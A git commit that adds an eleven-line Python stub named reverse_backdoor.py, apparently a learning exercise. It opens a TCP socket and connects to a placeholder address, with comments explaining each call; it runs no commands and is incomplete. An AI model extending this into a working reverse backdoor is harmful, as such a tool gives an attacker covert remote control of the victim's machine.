ce04c56e397535654d98cf5640b1ccc02fbb6b29
syntax-eror <46492218+syntax-eror@users.noreply.github.com>
2019-07-30 15:51:42 -0700

    Create reverse_backdoor.py

---
+++ reverse_backdoor.py
@@ -0,0 +1,11 @@
+#!/usr/bin/env python3
+
+import socket
+
+connection = socket.socket(socket.AF_INET,  socket.SOCK_STREAM) #create instance of socket object
+#takes two args - 1 - address family, 2 - socket type
+
+connection.connect(("IP", port)) #connect method from connection variable
+#connect method takes a tuple
+#takes IP and port arguments
+#create socket connection from host to target IP and port
